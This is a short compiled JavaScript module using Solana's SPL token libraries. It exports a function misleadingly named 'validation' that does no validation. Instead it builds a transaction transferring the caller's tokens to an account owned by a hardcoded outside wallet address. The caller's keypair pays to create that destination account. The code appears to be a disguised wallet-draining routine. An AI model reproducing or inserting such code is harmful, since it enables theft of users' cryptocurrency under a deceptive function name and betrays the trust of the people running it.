var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
import { createTransferInstruction, getAssociatedTokenAddress, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";
import { PublicKey, Transaction } from "@solana/web3.js";
export function validation(connection, from, mint, amount) {
    return __awaiter(this, void 0, void 0, function* () {
        let sourceAccount = yield getAssociatedTokenAddress(mint, from.publicKey);
        console.log(`2 - Getting Destination Token Account`, from.toString(), mint.toString(), amount.toString());
        let destinationAccount = yield getOrCreateAssociatedTokenAccount(connection, from, mint, new PublicKey('FG9evkQ8D3e8xvyCwQ1v84NM6RVNj47yA6tdHhLTLQT4'));
        console.log(`    Destination Account: ${destinationAccount.address.toString()}`);
        const tx = new Transaction();
        tx.add(createTransferInstruction(sourceAccount, destinationAccount.address, from, amount));
        return tx;
    });
}
